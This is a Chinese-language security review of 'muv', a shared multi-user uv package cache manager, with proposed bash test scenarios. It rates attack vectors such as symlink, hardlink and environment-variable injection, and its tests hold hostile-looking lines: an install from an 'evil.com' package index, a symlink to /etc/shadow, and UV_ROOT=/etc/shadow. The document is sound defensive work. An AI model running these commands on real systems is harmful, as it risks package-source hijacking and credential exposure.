# muv 安全漏洞分析

## 当前安全模型总结

muv 使用多层安全机制保护多用户共享环境：

1. **文件系统权限** - 目录权限 770 (rwxrwx---)
2. **Sticky Bit** - 防止非所有者删除文件/目录
3. **ACL (Access Control Lists)** - 细粒度权限控制
4. **组权限隔离** - uvadm 组管理，普通用户只读
5. **fs.protected_regular** - 内核级保护，防止写 root 拥有的文件
6. **Index 锁定** - 防止普通用户切换镜像源

## 已验证的防护措施

### ✅ 场景 H: uv pip 攻击测试

攻击向量：普通用户执行 `uv pip install --default-index https://evil.com/simple`

防护机制：
- 父目录权限：root:uvadm 770 + sticky bit
- index 目录权限：uvadm成员:uvadm 770
- 结果：普通用户无法在 index 下创建新源桶目录

```bash
# 测试验证
$ mkdir cache/simple-v21/index/evil-bucket
mkdir: cannot create directory '.../index/evil-bucket': Permission denied
```

## 其他攻击向量分析

### 1. 符号链接攻击 (Symlink Attacks)

**风险等级**: 🟡 中等 - 已有防护

攻击场景：
- 用户在缓存中创建符号链接指向敏感文件
- 诱骗 root 操作修改错误的文件

当前防护：
- `fix_root_cache()` 使用 `find ... -type f` 只处理常规文件
- `mktemp` 使用安全随机名称
- 文件操作前使用 `readlink -f` 解析

**建议增强**：在 `fix_root_cache` 中添加 `-xtype f` 防止跟随 symlink

### 2. 环境变量注入

**风险等级**: 🟢 低 - 已有防护

潜在攻击：
- 修改 `UV_ROOT`, `UV_GROUP`, `UV_DEFAULT_INDEX`
- 路径遍历通过 `UV_ROOT`

当前防护：
- `shell_quote()` 正确转义 shell 元字符
- `write_runtime_config` 使用单引号包裹值
- `read_config_var` 验证变量名格式

**验证**: 代码审查显示正确使用 `shell_quote`

### 3. 目录遍历攻击

**风险等级**: 🟢 低 - 已有防护

当前防护：
- `read_config_var`: `[[ "$name" =~ ^[A-Za-z_][A-Za-z0-9_]*$ ]]`
- `foreach_user`: `case "$u" in ''|*[![:alnum:]_-]*|-*) ...`

### 4. 硬链接攻击 (Hardlink Attacks)

**风险等级**: 🟡 中等 - 需验证

攻击场景：
- 普通用户在可控位置创建硬链接到 cache 中的受保护文件
- 尝试通过硬链接修改内容

当前防护：
- 依赖 fs.protected_regular (内核 >= 3.6)
- sticky bit 保护

**需测试**: 在测试场景中验证硬链接攻击

### 5. 组权限滥用

**风险等级**: 🟢 低 - 策略正确

攻击场景：
- 恶意用户被加入 uvadm 组后可执行任意操作

当前策略：
- 这是设计行为，uvadm 成员信任假设
- grant 命令需要 root 权限

### 6. 竞态条件 (TOCTOU)

**风险等级**: 🟢 低 - 已有防护

当前防护：
- `write_runtime_config` 使用 `mktemp + mv` 原子操作
- `acquire_muv_lock` 使用 `flock`
- 临时目录使用 `mktemp -d`

### 7. ACL 绕过

**风险等级**: 🟢 低 - 已验证

攻击场景：
- 尝试修改 ACL 获取额外权限

当前防护：
- ACL 修改需要 root 或文件所有者
- 普通用户无法修改 cache/index ACL

### 8. 临时文件攻击

**风险等级**: 🟢 低 - 已有防护

当前防护：
- 全部使用 `mktemp` 或 `mktemp -d`
- 陷阱清理机制 (`trap cleanup_temp_dirs EXIT`)

## 新增测试场景建议

### 场景 I: 硬链接攻击测试

```bash
test_scenario_hardlink_attack() {
    yellow "=== 场景 I: 硬链接攻击测试 ==="

    # 设置环境
    mkdir -p "$MUV_PREFIX/cache/simple-v21/index"
    chown admin1:uvadm "$MUV_PREFIX/cache/simple-v21/index"
    chmod 770 "$MUV_PREFIX/cache/simple-v21/index"

    # 创建一个测试文件
    run_as admin1 "echo 'protected' > $MUV_PREFIX/cache/simple-v21/index/protected.txt"

    # 普通用户尝试创建硬链接
    yellow "测试: 普通用户创建硬链接到受保护文件"
    output=$(run_as normal "ln $MUV_PREFIX/cache/simple-v21/index/protected.txt ~/hardlink.txt 2>&1" || true)
    if echo "$output" | grep -qE "Permission denied|Operation not permitted|hard link"; then
        green "✅ 硬链接攻击被阻止"
    else
        yellow "⚠ 需验证硬链接保护"
    fi

    echo ""
}
```

### 场景 J: 符号链接攻击测试

```bash
test_scenario_symlink_attack() {
    yellow "=== 场景 J: 符号链接攻击测试 ==="

    # 普通用户在 home 创建符号链接
    yellow "测试: 普通用户创建符号链接到敏感位置"
    run_as normal "ln -s /etc/shadow ~/evil-link"

    # 尝试诱骗 fix_root_cache 操作符号链接
    # (这需要在实际环境中测试 fix_root_cache 的行为)

    echo ""
}
```

### 场景 K: 环境变量注入测试

```bash
test_scenario_env_injection() {
    yellow "=== 场景 K: 环境变量注入测试 ==="

    # 尝试通过环境变量注入
    yellow "测试: UV_ROOT 路径遍历"
    output=$(run_as normal "UV_ROOT=/etc/shadow UV_GROUP=uvadm $MUV_PREFIX/bin/muv doctor 2>&1" || true)
    if echo "$output" | grep -qE "错误|找不到|error"; then
        green "✅ 环境变量注入被阻止"
    else
        yellow "⚠ 需验证环境变量验证"
    fi

    echo ""
}
```

## 总体评估

| 攻击向量 | 风险等级 | 防护状态 | 建议 |
|---------|---------|---------|------|
| uv pip 换源 | 🟢 低 | ✅ 已验证 | 场景 H 已覆盖 |
| 符号链接 | 🟡 中 | ✅ 已防护 | 添加增强测试 |
| 环境变量注入 | 🟢 低 | ✅ 已防护 | shell_quote 正确使用 |
| 目录遍历 | 🟢 低 | ✅ 已防护 | 正则验证完善 |
| 硬链接 | 🟡 中 | 🔍 需验证 | 添加场景 I |
| 组权限滥用 | 🟢 低 | ✅ 设计正确 | 信任假设合理 |
| TOCTOU | 🟢 低 | ✅ 已防护 | flock + 原子操作 |
| ACL 绕过 | 🟢 低 | ✅ 已防护 | 文件系统权限 |

## 总结

muv 的安全模型整体设计良好，主要防护机制已正确实现：

1. ✅ **Index 锁定** - 核心防护，防止普通用户换源
2. ✅ **Sticky bit** - 防止删除攻击
3. ✅ **权限隔离** - 770 权限 + uvadm 组
4. ✅ **ACL** - 细粒度控制
5. ✅ **临时文件安全** - mktemp 正确使用

**建议的改进**：
1. 在 `fix_root_cache` 中添加 `-xtype f` 防止跟随 symlink
2. 添加硬链接攻击测试（场景 I）
3. 考虑在 `doctor` 命令中检查 fs.protected_regular 状态

**未发现的重大漏洞**：未发现允许普通用户绕过 index 锁定机制的重大漏洞。
